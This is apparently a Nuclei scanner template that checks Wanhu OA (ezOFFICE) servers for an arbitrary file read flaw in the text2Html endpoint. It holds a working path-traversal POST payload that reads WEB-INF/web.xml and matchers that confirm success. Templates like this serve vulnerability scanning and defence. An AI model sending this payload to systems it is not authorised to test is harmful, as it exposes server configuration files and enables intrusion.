id: wanhuoa-text2html-lfi

info:
  name: Wanhu OA text2Html - Local File Inclusion
  author: qwtd
  severity: medium
  description: 万户OA text2Html接口存在任意文件读取漏洞
  tags: 万户网络-ezOFFICE

http:
    - method: POST
      path: 
        - "{{RootURL}}/defaultroot/convertFile/text2Html.controller"
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
      
      
      matchers-condition: and
      matchers:
        - type: word
          words:
            - web-app
            - com.whir.ezoffice.microblog.util.JQUploayify
          condition: and
        - type: status
          status:
            - 200
